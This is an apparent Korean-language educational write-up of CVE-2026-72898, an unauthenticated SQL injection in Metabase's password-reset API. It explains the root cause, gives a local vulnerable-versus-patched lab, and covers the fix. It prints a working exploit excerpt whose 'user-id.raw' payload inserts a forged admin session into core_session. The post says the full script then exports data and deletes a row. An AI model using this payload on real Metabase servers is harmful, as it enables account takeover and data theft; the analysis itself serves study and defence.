---
title: "CVE-2026-72898: Metabase 비밀번호 재설정 API의 SQL Injection"
date: 2026-10-07
categories: ["1-day", "Education"]
tags: ["CVE-2026-72898", "Metabase", "SQL Injection", "Web"]
summary: "Metabase의 비밀번호 재설정 요청이 관리자 세션 생성으로 이어진 원인을 분석하고, 취약판과 패치판을 로컬 실습으로 비교합니다."
---

## Intro

안녕하세요! 이번에는 **CVE-2026-72898**을 분석해보겠습니다.

Metabase는 데이터베이스를 연결해 표와 대시보드로 분석하는 도구입니다. 그래서 Metabase에 관리자 권한으로 접근할 수 있다면, Metabase에 연결된 데이터에도 접근할 수 있습니다. [공식 보안 권고](https://github.com/metabase/metabase/security/advisories/GHSA-vwf4-m7j8-wcjf)에 따르면 이번 취약점은 **인증되지 않은 요청으로 Metabase 애플리케이션 DB에 SQL을 주입**할 수 있었고, 실제 악용도 확인됐습니다.

이번 글에서는 단순히 `user-id`에 SQL을 넣었다는 설명에서 한 단계 더 들어가, **그 값이 어떤 함수를 거쳐 SQL로 해석됐는지** 살펴보겠습니다. 마지막에는 제가 준비한 [로컬 실습 저장소](https://github.com/amier-ge/cve-2026-72898)에서 취약판과 패치판을 비교합니다.
<br><br>

---

## 00_Metabase의 두 데이터베이스

먼저 DB 두 개를 구분해야 합니다.

| 구분 | 저장하는 내용 | 이번 실습에서의 역할 |
| --- | --- | --- |
| **애플리케이션 DB** | Metabase 사용자, 세션, 설정 | SQL Injection이 **직접 발생**하는 곳 |
| **연결된 분석 DB** | 고객·주문처럼 Metabase가 분석하는 데이터 | 탈취한 관리자 세션으로 **나중에 접근**하는 곳 |

실습에서는 취약한 Metabase를 `localhost:3001`, 패치된 Metabase를 `localhost:3002`에 띄웁니다. 두 인스턴스의 애플리케이션 DB는 분리하고, 가상의 쇼핑몰 분석 DB는 공유합니다. 따라서 주문 삭제는 **비밀번호 재설정 SQL 주입의 직접 결과**가 아닙니다. 먼저 애플리케이션 DB에 관리자 세션을 만든 다음, 그 세션으로 Metabase API를 호출해 수행하는 후속 행위입니다.
<br><br>

---

## 01_취약점 원인 분석

### 01-1_예상 밖의 `user-id`가 인증 함수까지 도달함

취약판 `v0.63.2`의 [비밀번호 재설정 API](https://github.com/metabase/metabase/blob/v0.63.2/src/metabase/session/api.clj#L310-L323)는 요청에서 `token`과 `password`를 검사합니다. 하지만 입력 스키마가 닫혀 있지 않아 다른 필드도 허용했습니다. 게다가 인증 함수에는 두 값만 따로 전달하지 않고 **요청 본문 전체**를 전달했습니다.

`user-id`는 정상적인 비밀번호 재설정 요청에 필요한 필드가 아닙니다. 아래는 공격 요청의 핵심 모양입니다. 

```json
{
  "token": "invalid-lab-token",
  "password": "실습용_새_비밀번호",
  "user-id": {"raw": "SQL 구문"}
}
```

### 01-2_토큰이 틀렸는데도 `user-id`가 남는 이유

여기가 처음에는 가장 헷갈렸습니다. [토큰 인증 코드](https://github.com/metabase/metabase/blob/v0.63.2/src/metabase/auth_identity/providers/emailed_secret.clj#L110-L163)는 무효한 토큰에 대해 실패 결과를 반환합니다. 그런데 [로그인 흐름](https://github.com/metabase/metabase/blob/v0.63.2/src/metabase/auth_identity/provider.clj#L266-L273)은 **원래 요청과 인증 결과를 합칩니다.** 개념적으로는 아래와 같습니다.

```text
원래 요청:  {token: "잘못된 토큰", user-id: {raw: "SQL 구문"}}
인증 결과:  {success?: false, error: "invalid-token"}
합친 결과:  {token: "잘못된 토큰", user-id: {raw: "SQL 구문"},
             success?: false, error: "invalid-token"}
```


실패 결과에는 `user-id`가 없으므로, **공격자가 요청에 넣은 값이 합친 결과에 그대로 남습니다.** 이어지는 코드가 그 `user-id`를 꺼내 “이 ID를 가진 사용자를 찾아라”라는 DB 조회의 조건으로 사용합니다. 인증이 성공해서 얻은 ID가 아니라, **검증되지 않은 요청의 ID**가 조회에 쓰인 것입니다.

### 01-3_왜 SQL 문장으로 바뀌는가?

사용자 조회를 담당하는 Toucan2는 내부에서 HoneySQL로 SQL을 만듭니다. 정상적인 숫자 ID라면 `WHERE id = ?`의 **매개변수 값**으로 다뤄집니다. 그런데 공격자가 전달한 것은 숫자가 아닌 `{"raw": "..."}` 객체입니다. [HoneySQL의 `raw` 기능](https://github.com/seancorfield/honeysql/blob/develop/doc/special-syntax.md#raw)은 내용을 SQL에 그대로 출력하는 특별한 표현입니다.

즉, `merge` 자체가 SQL을 실행하는 것은 아닙니다. **요청의 `user-id` 객체 → 사용자 조회 조건 → SQL 생성기의 `raw` 해석 → 애플리케이션 DB에서 SQL 실행** 순서로 이어집니다. 제조사의 [원인 분석](https://www.metabase.com/blog/vulnerability-what-happened)도 열린 입력 스키마, 요청 본문 전체 전달, 사용자 ID 조회, `raw` 해석이라는 네 단계를 설명합니다.

무효한 재설정 토큰 때문에 최종 응답은 **HTTP 400**일 수 있습니다. 그러나 그전에 사용자 조회 과정에서 SQL이 실행됐다면, 400만으로 공격 실패라고 판단할 수 없습니다.
<br><br>

---

## 02_Exploit Ideation

목표는 비밀번호를 재설정하는 것이 아니라, **애플리케이션 DB의 `core_session`에 관리자 세션을 만드는 것**입니다. 실습의 `exp.py`는 임의의 세션 키를 만든 뒤 그 해시를 DB에 저장하는 SQL을 `user-id.raw`에 넣습니다. 첫 Metabase 사용자는 초기 설정 시 관리자이므로, 실습에서는 사용자 ID `1`에 연결된 세션을 만듭니다. 실제 사고에서도 공격자가 세션 테이블에 관리자 세션을 넣었다고 Metabase가 밝혔습니다. [[출처]](https://www.metabase.com/blog/vulnerability-what-happened)

흐름은 다음과 같습니다.

```text
POST /api/session/reset_password  →  토큰 오류로 HTTP 400
        │
        └─ 사용자 조회에서 SQL 주입 → 관리자 세션 행 생성
GET  /api/user/current            →  주입으로 만든 세션이 유효하면 HTTP 200
```

여기서 `POST`의 400보다 **두 번째 요청이 관리자 권한으로 성공하는지**가 더 중요한 검증 지점입니다.
<br><br>

---

## 03_로컬 실습 준비

[실습 저장소](https://github.com/amier-ge/cve-2026-72898)를 받은 뒤 Windows PowerShell에서 실행합니다. Docker Desktop의 Linux 엔진과 Python 3.10 이상이 필요합니다. 첫 실행에서는 Docker가 빌드된 Metabase 이미지를 내려받습니다.

```powershell
.\start.ps1
```

`start.ps1`은 실습용 DB 비밀번호를 `.env`에 생성합니다. 두 주소에 각각 접속해 초기 관리자 계정을 만든 다음, **각 Metabase에서** 가상 쇼핑몰 PostgreSQL DB를 연결합니다.

| 항목 | 값 |
| --- | --- |
| Metabase | `http://localhost:3001/setup`, `http://localhost:3002/setup` |
| 분석 DB 표시 이름 | `가상 쇼핑몰` |
| 호스트 / 포트 | `analytics-db` / `5432` |
| DB / 사용자 | `shop_demo` / `analytics_reader` |
| 비밀번호 | `.env`의 `ANALYTICS_READER_PASSWORD` |

준비가 끝나면 `.\verify.ps1`로 **고객 4건, 주문 5건, 105번 주문 존재**를 확인합니다. 구체적인 화면 설정 순서는 [저장소 README](https://github.com/amier-ge/cve-2026-72898#readme)에 적어두었습니다.
<br><br>

---

## 04_Exploit

이제 같은 `exp.py`를 두 인스턴스에 실행합니다.

```powershell
python .\exp.py localhost:3001
.\verify.ps1
python .\exp.py localhost:3002
```

<details>
<summary>Exploit 코드의 중요 부분</summary>

아래는 [전체 exp.py](https://github.com/amier-ge/cve-2026-72898/blob/main/exp.py)에서 흐름을 보여 주는 부분만 발췌한 코드입니다.

```python
session_hash = hashlib.sha512(session_key.encode("ascii")).hexdigest()
sql = (
    "1); INSERT INTO core_session (id, user_id, created_at, key_hashed) "
    f"VALUES ('{session_id}', 1, now(), '{session_hash}'); --"
)
payload = {
    "token": "invalid-lab-token",
    "password": "R7mK9vT4qH2pL8xB6nD3sY5a",
    "user-id": {"raw": sql},
}
status, _ = api("POST", "/api/session/reset_password", body=payload)
status, current = api("GET", "/api/user/current", session=session_key)
```

</details>

취약판 `3001`에서는 관리자 세션 확인에 성공합니다. 이후 스크립트가 Metabase API를 통해 가상 고객·주문을 `exports/run-.../` 아래 CSV로 저장하고, `analytics.orders`의 **가상 주문 `order_id=105` 한 행**을 삭제합니다. `.\verify.ps1`의 주문 수는 **5 → 4**, `order_105_present`는 **true → false**가 됩니다.

패치판 `3002`에도 **같은 요청**을 보내지만, 생성한 세션으로 `/api/user/current`를 호출하면 **HTTP 401**이 나옵니다. 따라서 CSV 저장과 주문 삭제 단계는 실행되지 않습니다.
<br><br>

**주의해서 해석할 점:** 고객·주문 DB를 직접 SQL 주입한 것이 아닙니다. SQL 주입으로 Metabase 관리자 세션을 만든 뒤, 그 세션으로 연결된 DB에 접근했습니다. 또한 주문 삭제가 가능한 이유는 실습용 연결 계정에 `analytics.orders`의 `DELETE` 권한을 의도적으로 주었기 때문입니다. 읽기 전용 계정이라면 같은 삭제는 불가능합니다.
<br><br>

---

## 05_패치와 복구

[패치 계열의 API 코드](https://github.com/metabase/metabase/blob/v0.63.18/src/metabase/session/api.clj#L317-L333)는 입력 맵을 닫고(`{:closed true}`), 인증 단계에 `token`과 `password`만 전달합니다. 제조사는 인증 진입점의 악용 가능한 키 거부와 내부 유틸리티의 예상 밖 키 검사도 함께 수정했다고 설명합니다. [[Metabase 패치 설명]](https://www.metabase.com/blog/vulnerability-what-happened)

실습에서는 패치판 Docker 이미지 `v0.63.18.3`을 사용합니다. 위 코드 링크의 `v0.63.18`은 공개 소스 태그이며, 이 취약점에 대한 0.63 계열의 최초 수정 버전은 공식 권고에 적힌 `v0.63.5`입니다. [[버전 정보]](https://github.com/metabase/metabase/security/advisories/GHSA-vwf4-m7j8-wcjf)

실습 후에는 가상 주문을 복구하고 CSV 사본을 정리합니다.

```powershell
python .\recover.py
.\verify.ps1
```

다시 **주문 5건과 105번 주문 존재**가 확인됩니다. `recover.py`는 실습 데이터를 복구하는 코드이며, 이미 외부로 유출된 실제 데이터를 되돌리는 대응책은 아닙니다.
<br><br>

---

## 06_Outro

이번 사례에서 인상적인 부분은 한 줄의 문자열 연결 실수가 아니라, **여러 계층의 동작이 이어져 외부 입력을 SQL 생성기의 명령으로 취급했다**는 점입니다. 비밀번호 재설정 응답이 400이어도 이미 SQL이 실행될 수 있었고, 애플리케이션 DB의 세션 조작은 연결된 분석 DB의 데이터 접근으로 이어졌습니다.

오늘도 긴 글 읽어주셔서 감사합니다 :)
